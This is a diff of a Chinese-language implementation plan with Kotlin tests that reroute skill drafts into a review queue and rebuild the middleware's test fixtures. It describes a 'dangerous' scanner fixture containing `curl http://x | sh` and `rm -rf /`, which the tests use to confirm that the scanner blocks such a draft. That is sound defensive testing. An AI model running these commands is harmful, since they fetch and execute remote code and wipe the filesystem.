@@ -1231,74 +1231,105 @@ git commit -m "feat(skill): 可用区在交付技能之前注册并晚绑定—�
 
 - [ ] **Step 1: 写失败测试**
 
-在 `SkillDraftSubmitMiddlewareTest.kt` 追加/替换（保留该文件已有的 cooldown 与「无草稿不提交」两支，改夹具即可）：
+这一步是**整文件重挂夹具**，不是追加。该文件现有 8 支用例的判据全写在 `verify(agent).promoteSkill(...)` 上（`:83`、`:90`、`:91`、`:102`、`:113`、`:120`），而 Step 3 之后中间件再也不碰 `promoteSkill`——原样留着必红，整片删掉又把冷却与「答完之后失败不许渗进答案」两条性质一起丢了。所以：夹具换一套，8 支按下面的表逐条搬家。
+
+保留 `@Mock agent: HarnessAgent`（`onAgent` 的第一形参仍要传）、`ctx = RuntimeContext.empty()`、`now`、`COOLDOWN`、companion 里的 `DRAFTS`/`MODIFIED`；删掉 `@Mock workspaceManager`、`@Mock filesystem` 与 `staged(vararg names)`（那是旧读盘路径的替身），换成：
 
 ```kotlin
-/**
- * The reason the review queue was empty on a real deployment: the offer ran after the answer, by which
- * time SandboxLifecycleMiddleware has unbound the sandbox and every workspace read answers `No active
- * sandbox`. So the offer takes a container handle, not the agent's filesystem.
- */
-@Test
-fun `the draft is filed straight into the queue instead of through the promotion gate`() {
-    val draft = SessionDraft("invoice-fill", "fills an invoice", MD, mapOf("scripts/run.sh" to "echo hi\n"))
-    val store = Mockito.mock(SessionSkillStore::class.java)
-    Mockito.`when`(store.listDraftNames("ses-1")).thenReturn(listOf("invoice-fill"))
-    Mockito.`when`(store.readDraft("ses-1", "invoice-fill")).thenReturn(draft)
-    val adaptor = Mockito.mock(SkillDraftAdaptor::class.java)
-    Mockito.`when`(adaptor.submit(any())).thenReturn(SkillDraftIntake.Queued(7L))
+    private val store = Mockito.mock(SessionSkillStore::class.java)
+    private val adaptor = Mockito.mock(SkillDraftAdaptor::class.java)
 
-    runTurn(SkillDraftSubmitMiddleware(sessionId = "ses-1", store = store, adaptor = adaptor))
-
-    val proposal = argumentCaptor<SkillDraftProposal>()
-    Mockito.verify(adaptor).submit(proposal.capture())
-    assertEquals("ses-1", proposal.firstValue.sessionId)
-    assertEquals("invoice-fill", proposal.firstValue.name)
-    assertEquals(MD, proposal.firstValue.skillmd)
-    assertEquals(setOf("scripts/run.sh"), proposal.firstValue.resources.keys)
-    assertTrue(
-        proposal.firstValue.scanVerdict == "SAFE" || proposal.firstValue.scanVerdict == "CAUTION",
-        "the verdict column has to carry the scan this path ran: ${proposal.firstValue.scanVerdict}",
-    )
-}
-
-@Test
-fun `a draft the scanner blocks is not filed`() {
-    val store = Mockito.mock(SessionSkillStore::class.java)
-    Mockito.`when`(store.listDraftNames("ses-1")).thenReturn(listOf("evil"))
-    Mockito.`when`(store.readDraft("ses-1", "evil"))
-        .thenReturn(SessionDraft("evil", "d", DANGEROUS_MD, emptyMap()))
-    val adaptor = Mockito.mock(SkillDraftAdaptor::class.java)
-
-    runTurn(SkillDraftSubmitMiddleware(sessionId = "ses-1", store = store, adaptor = adaptor))
-
-    Mockito.verifyNoInteractions(adaptor)
-}
-
-@Test
-fun `a draft that cannot be read is left for the next turn`() {
-    val store = Mockito.mock(SessionSkillStore::class.java)
-    Mockito.`when`(store.listDraftNames("ses-1")).thenReturn(listOf("invoice-fill"))
-    Mockito.`when`(store.readDraft("ses-1", "invoice-fill")).thenReturn(null)
-    val adaptor = Mockito.mock(SkillDraftAdaptor::class.java)
-
-    runTurn(SkillDraftSubmitMiddleware(sessionId = "ses-1", store = store, adaptor = adaptor))
-
-    Mockito.verifyNoInteractions(adaptor)
-}
-
-private fun runTurn(middleware: SkillDraftSubmitMiddleware) {
-    val agent = Mockito.mock(Agent::class.java)
-    val ctx = RuntimeContext.builder().sessionId("ses-1").build()
-    Flux.empty<AgentEvent>().let { next ->
-        middleware.onAgent(agent, ctx, AgentInput(emptyList()), { next }).collectList().block()
+    /** The store answers exactly these drafts; every submit is accepted by the queue. */
+    private fun staged(vararg drafts: SessionDraft) {
+        `when`(store.listDraftNames("ses-1")).thenReturn(drafts.map { it.name })
+        drafts.forEach { `when`(store.readDraft("ses-1", it.name)).thenReturn(it) }
+        `when`(adaptor.submit(any())).thenReturn(SkillDraftIntake.Queued(7L))
     }
-    // the offer is scheduled on boundedElastic; wait for it the same way the existing tests do
-    Thread.sleep(200L)
-}
+
+    private fun middleware() = SkillDraftSubmitMiddleware(
+        sessionId = "ses-1",
+        store = store,
+        adaptor = adaptor,
+        cooldownMillis = COOLDOWN,
+        clock = { now },
+        scheduler = Schedulers.immediate(),
+    )
 ```
 
-`MD` / `DANGEROUS_MD` 用 Task 4 测试里的同两份文本，作 `private companion object` 常量。若该文件已有等待形状（`Cooldown`/`Trampoline` scheduler 夹具），沿用它并把 `scheduler` 显式传入，不要靠 `Thread.sleep`。
+`SkillDraftSubmitMiddleware.turn()`（`:75-77`）与 `agent`/`ctx` 的形状**原样不动**——`scheduler = Schedulers.immediate()` 已经让 offer 同步跑完，所以搬家后的用例一律继续 `middleware().turn()`，不许新写等待。
+
+搬家对照表（左列号是现文件的行）：
+
+| 现有用例 | 处置 | 新判据 |
+| --- | --- | --- |
+| `:80` 一支草稿走完晋升管线 | 由下面新增第一支取代 | 删掉本支，队列直投那条断言更全 |
+| `:87` 每次暂存的草稿都上报不只第一支 | 留 | `verify(adaptor).submit(...)` 对两个名字各一次（`argumentCaptor` 取 allValues） |
+| `:95` 窗口内同一草稿不重复上报 | 留 | `verify(adaptor, times(1)).submit(...)` |
+| `:106` 过了窗口同一草稿再上报 | 留 | `now += COOLDOWN` 后 `times(2)` |
+| `:117` 空暂存不起晋升 | 留，改名 `an empty draft list files nothing` | `verifyNoInteractions(adaptor)` |
+| `:124` 未绑定 agent 的暂存无内容可报 | 换 | 这一性质已进 Task 3 的 store 用例，本位置改放下面新增第三支（读不到正文留给下一轮） |
+| `:131` 起不动的管线不碰答案 | 留 | `adaptor.submit` 抛异常 → `assertDoesNotThrow { middleware().turn() }` |
+| `:139` 答完之后失败的管线只记日志不抛 | 留 | `store.listDraftNames` 抛异常 → `assertDoesNotThrow { middleware().turn() }` |
+
+净数 8 → 10 支（-2 支被替换、+4 支新增）。
+
+```kotlin
+    /**
+     * The reason the review queue was empty on a real deployment: the offer ran after the answer, by which
+     * time SandboxLifecycleMiddleware has unbound the sandbox and every workspace read answers `No active
+     * sandbox`. So the offer takes a container handle, not the agent's filesystem.
+     */
+    @Test
+    fun `the draft is filed straight into the queue instead of through the promotion gate`() {
+        staged(SessionDraft("invoice-fill", "fills an invoice", MD, mapOf("scripts/run.sh" to "echo hi\n")))
+
+        middleware().turn()
+
+        val proposal = argumentCaptor<SkillDraftProposal>()
+        verify(adaptor).submit(proposal.capture())
+        assertEquals("ses-1", proposal.firstValue.sessionId)
+        assertEquals("invoice-fill", proposal.firstValue.name)
+        assertEquals(MD, proposal.firstValue.skillmd)
+        assertEquals(setOf("scripts/run.sh"), proposal.firstValue.resources.keys)
+        assertTrue(
+            proposal.firstValue.scanVerdict == "SAFE" || proposal.firstValue.scanVerdict == "CAUTION",
+            "the verdict column has to carry the scan this path ran: ${proposal.firstValue.scanVerdict}",
+        )
+        verifyNoInteractions(agent)
+    }
+
+    @Test
+    fun `a draft the scanner blocks is not filed`() {
+        staged(SessionDraft("evil", "d", DANGEROUS_MD, emptyMap()))
+
+        middleware().turn()
+
+        verifyNoInteractions(adaptor)
+    }
+
+    @Test
+    fun `a draft that cannot be read is left for the next turn`() {
+        // The listing answered and the read did not: the draft is either gone or has no text, and neither is
+        // something the queue can review, so nothing is filed and the slot is not burned.
+        `when`(store.listDraftNames("ses-1")).thenReturn(listOf("invoice-fill"))
+        `when`(store.readDraft("ses-1", "invoice-fill")).thenReturn(null)
+
+        middleware().turn()
+
+        verifyNoInteractions(adaptor)
+    }
+
+    @Test
+    fun `a store that cannot list files nothing and never reaches the answer`() {
+        `when`(store.listDraftNames("ses-1")).thenThrow(IllegalStateException("No active sandbox"))
+
+        assertDoesNotThrow { middleware().turn() }
+
+        verifyNoInteractions(adaptor)
+    }
+```
+
+`MD` / `DANGEROUS_MD` 逐字取 `SessionSkillStoreEnableTest.kt:218-221` 那两份 companion 常量（benign 的那份是 `name: invoice-fill` 的正常技能，危险那份正文里带 `curl http://x | sh` 与 `rm -rf /`）——扫描器对这两份的判定已经在 Task 4 被测实过，另写一份文本就等于赌扫描规则。`verifyNoInteractions(agent)` 那一支是把「不再经 agent 的晋升管线」写死成判据：`agent` 若又被拉回这条路径，它会红。
 
 - [ ] **Step 2: 跑测试确认失败**
 
@@ -1387,7 +1418,17 @@ class SkillDraftSubmitMiddleware(
     }
 ```
 
-`claim`（`:98-110`）原样保留。`ctx` 参数从 `offerStagedDrafts` 一路去掉——上报不再走 agent 的工作区文件系统，这正是这一跳修好的东西。imports 换成 `SkillSecurityScanner`、`SkillDraftAdaptor`、`SkillDraftIntake`、`SkillDraftProposal`，删掉 `SkillPromoter` 与 `RuntimeContext`（若 `onAgent` 仍需要 `RuntimeContext` 则保留）。
+`claim`（`:98-110`）原样保留。Step 3 的代码里 `findingTexts(scan.findings())` 与 Step 4 的 `findingTexts(…)` 现在**全仓都不存在**——唯一等价物是 `AdminBackedPromotionGate.kt:104-105` 的私有成员 `describe(finding)`，中间件调不到。所以本步要把它升成同包的一条顶层函数，放在 `SkillDraftSubmitMiddleware.kt` 的类外（两个调用点都在 `com.agnetix.harnax.harness.skill` 包内，不需要 import），正文逐字沿用 `describe` 的拼接形状，别让队列的 findings 列在计划中途换形状：
+
+```kotlin
+/** One scan finding as the queue shows it: rule, severity/category, place, then the matched text. */
+fun findingTexts(findings: List<SkillSecurityScanner.Finding>): List<String> =
+    findings.map {
+        "${it.patternId()} [${it.severity()}/${it.category()}] ${it.file()}:${it.line()} ${it.description()}"
+    }
+```
+
+`ctx` 参数从 `offerStagedDrafts` 一路去掉——上报不再走 agent 的工作区文件系统，这正是这一跳修好的东西。imports 换成 `SkillSecurityScanner`、`SkillDraftAdaptor`、`SkillDraftIntake`、`SkillDraftProposal`，删掉 `SkillPromoter` 与 `RuntimeContext`（若 `onAgent` 仍需要 `RuntimeContext` 则保留）。
 
 文件里的 `SYSTEM_REVIEWER` 常量与 `report(…)`/`staging.promote(…)` 路径整块删除（`report` 的三个 status 不再可达；gate 那条路仍由 `AdminBackedPromotionGate` 承担）。
 
@@ -1422,7 +1463,7 @@ scanFindings = findingTexts(candidate.securityScan()?.findings().orEmpty()),
 - [ ] **Step 5: 跑该模块全量**
 
 Run: `... mvn -q spotless:apply -pl harnax-agent/harnax-harness-core && ... mvn -o test -pl harnax-agent/harnax-harness-core -am`
-Expected: `Failures: 0, Errors: 0`，总数不低于本任务开始时记下的模块基线（Task 1 之后为 664）
+Expected: `Failures: 0, Errors: 0`，总数 **689**（Task 6 之后 687 + 本任务净增 2 支：8 → 10）。若实到数与 689 不符，先数 `SkillDraftSubmitMiddlewareTest` 里剩几支再说，别改基线数字交差。
 
 - [ ] **Step 6: 提交**
 
